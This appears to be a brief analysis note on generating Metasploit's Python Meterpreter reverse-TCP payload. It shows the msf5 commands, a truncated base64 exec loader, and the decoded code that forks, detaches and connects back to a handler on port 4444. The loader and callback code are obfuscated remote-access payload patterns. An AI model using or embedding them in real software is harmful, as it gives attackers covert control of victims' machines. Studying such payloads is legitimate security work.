# python/meterpreter_reverse_tcp (single payload)

## Generate

```
msf5 > use python/meterpreter_reverse_tcp
msf5 payload(python/meterpreter_bind_tcp) > generate -f raw -o single.py
```
## Result
```python
import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('IyEvdXNyL2Jpbi9weXRob24KaW1wb3J0IGJpbmFzY2lpCmltcG9yd...
...)))
```

## Base64 Decoded Content
The meterpreter payload is invoked as follows (see end of file):
```python
...
_try_to_fork = TRY_TO_FORK and hasattr(os, 'fork')
if not _try_to_fork or (_try_to_fork and os.fork() == 0):
    if hasattr(os, 'setsid'):
        try:
            os.setsid()
        except OSError:
            pass
    if HTTP_CONNECTION_URL and has_urllib:
        transport = HttpTransport(HTTP_CONNECTION_URL, proxy=HTTP_PROXY, user_agent=HTTP_USER_AGENT,
                http_host=HTTP_HOST, http_referer=HTTP_REFERER, http_cookie=HTTP_COOKIE)
    else:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.connect(('127.0.0.1',4444))

        transport = TcpTransport.from_socket(s)
    met = PythonMeterpreter(transport)
    # PATCH-SETUP-TRANSPORTS #
    met.run()
```

Full payload contents are stored in file `single_decoded.py`.
